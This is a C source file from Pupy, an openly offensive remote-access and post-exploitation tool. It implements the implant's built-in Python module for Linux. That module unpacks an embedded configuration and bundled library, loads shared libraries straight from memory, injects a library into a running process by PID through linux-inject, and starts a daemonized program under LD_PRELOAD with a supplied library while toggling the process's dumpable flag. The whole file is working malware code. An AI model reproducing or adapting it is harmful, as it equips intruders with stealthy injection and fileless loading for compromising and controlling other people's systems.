/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/wait.h>
#include "debug.h"
#include "Python-dynload.h"
#include "daemonize.h"
#include <arpa/inet.h>
#include "tmplibrary.h"
#include <sys/mman.h>
#include "memfd.h"

#include "resources_library_compressed_string_txt.c"

int linux_inject_main(int argc, char **argv);

static const char module_doc[] = "Builtins utilities for pupy";

static const char pupy_config[8192]="####---PUPY_CONFIG_COMES_HERE---####\n";

#include "lzmaunpack.c"

static PyObject *Py_get_modules(PyObject *self, PyObject *args)
{
	static PyObject *modules = NULL;
	if (!modules) {
		modules = PyObject_lzmaunpack(
			resources_library_compressed_string_txt_start,
			resources_library_compressed_string_txt_size
		);

		munmap(resources_library_compressed_string_txt_start,
			resources_library_compressed_string_txt_size);

		Py_XINCREF(modules);
	}

	return modules;
}

static PyObject *
Py_get_pupy_config(PyObject *self, PyObject *args)
{
	static PyObject *config = NULL;
	if (!config) {
		size_t compressed_size = ntohl(
			*((unsigned int *) pupy_config)
		);

		config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);

		Py_XINCREF(config);
	}

	return config;
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
#ifdef __x86_64__
	return Py_BuildValue("s", "x64");
#elif __i386__
	return Py_BuildValue("s", "x86");
#else
	return Py_BuildValue("s", "unknown");
#endif
}

static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
{
	const char *lpCmdBuffer;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	PyObject* py_HookExit;

	if (!PyArg_ParseTuple(args, "zs#O", &lpCmdBuffer, &lpDllBuffer, &dwDllLenght, &py_HookExit))
		return NULL;

	char ldobject[PATH_MAX] = {};
	int cleanup_workaround = 0;
	int cleanup = 1;

	int fd = drop_library(ldobject, PATH_MAX, lpDllBuffer, dwDllLenght);
	if (fd < 0) {
		dprint("Couldn't drop library: %m\n");
		return NULL;
	}

	if (is_memfd_path(ldobject)) {
		char buf2[PATH_MAX];
		strncpy(buf2, ldobject, sizeof(buf2));
		snprintf(ldobject, sizeof(ldobject), "/proc/%d/fd/%d", getpid(), fd);
		cleanup_workaround = 1;
		cleanup = 0;
	}

	char cmdline[PATH_MAX*2] = {};
	snprintf(
		cmdline, sizeof(cmdline), "LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null",
		ldobject,
		PyObject_IsTrue(py_HookExit),
		cleanup,
		lpCmdBuffer,
		ldobject
	);

	dprint("Program to execute in child context: %s\n", cmdline);

	prctl(4, 1, 0, 0, 0);

	pid_t pid = daemonize(0, NULL, NULL, false);
	if (pid == 0) {
		/* Daemonized context */
		dprint("Daemonization complete - client\n");
		execl("/bin/sh", "/bin/sh", "-c", cmdline, NULL);
		unlink(ldobject);
		exit(255);
	}

	dprint("Daemonization complete - server\n");
	if (cleanup_workaround) {
		sleep(2);
		close(fd);
	}

	prctl(4, 0, 0, 0, 0);

	if (pid == -1) {
		dprint("Couldn\'t daemonize: %m\n");
		unlink(ldobject);
		return PyInt_FromLong(-1);
	}

	return PyInt_FromLong(pid);
}

static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
	uint32_t dwPid;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	const char *cpCommandLine;

	if (!PyArg_ParseTuple(args, "Is#", &dwPid, &lpDllBuffer, &dwDllLenght))
		return NULL;

	dprint("Injection requested. PID: %d\n", dwPid);

	char buf[PATH_MAX]={};
	int fd = drop_library(buf, PATH_MAX, lpDllBuffer, dwDllLenght);
	if (!fd) {
		dprint("Couldn't drop library: %m\n");
		return NULL;
	}

	if (is_memfd_path(buf)) {
		char buf2[PATH_MAX];
		strncpy(buf2, buf, sizeof(buf2));
		snprintf(buf, sizeof(buf), "/proc/%d/fd/%d", getpid(), fd);
	}

	char pid[20] = {};
	snprintf(pid, sizeof(pid), "%d", dwPid);

	char *linux_inject_argv[] = {
		"linux-inject", "-p", pid, buf, NULL
	};

	dprint("Injecting %s to %d\n", pid, buf);

	prctl(4, 1, 0, 0, 0);

	pid_t injpid = fork();
	if (injpid == -1) {
		dprint("Couldn't fork\n");
		close(fd);
		unlink(buf);
		return PyBool_FromLong(1);
	}

	int status;

	if (injpid == 0) {
		int r = linux_inject_main(4, linux_inject_argv);
		exit(r);
	} else {
		waitpid(injpid, &status, 0);
	}

	prctl(4, 0, 0, 0, 0);

	dprint("Injection code: %d\n", status);

	unlink(buf);
	/* close(fd); */

	if (WEXITSTATUS(status) == 0) {
		dprint("Injection successful\n");
		return PyBool_FromLong(1);
	} else {
		dprint("Injection failed\n");
		return PyBool_FromLong(0);
	}
}

static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
	uint32_t dwPid;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	const char *dllname;
	if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
		return NULL;

	printf("Py_load_dll(%s)\n", dllname);

	if(memdlopen(dllname, lpDllBuffer, dwDllLenght))
		return PyBool_FromLong(1);
	return PyBool_FromLong(0);
}

static PyMethodDef methods[] = {
	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
	{ "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure" },
	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
	{ "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
	{ NULL, NULL },		/* Sentinel */
};

DL_EXPORT(void)
initpupy(void)
{
	Py_InitModule3("pupy", methods, module_doc);
}
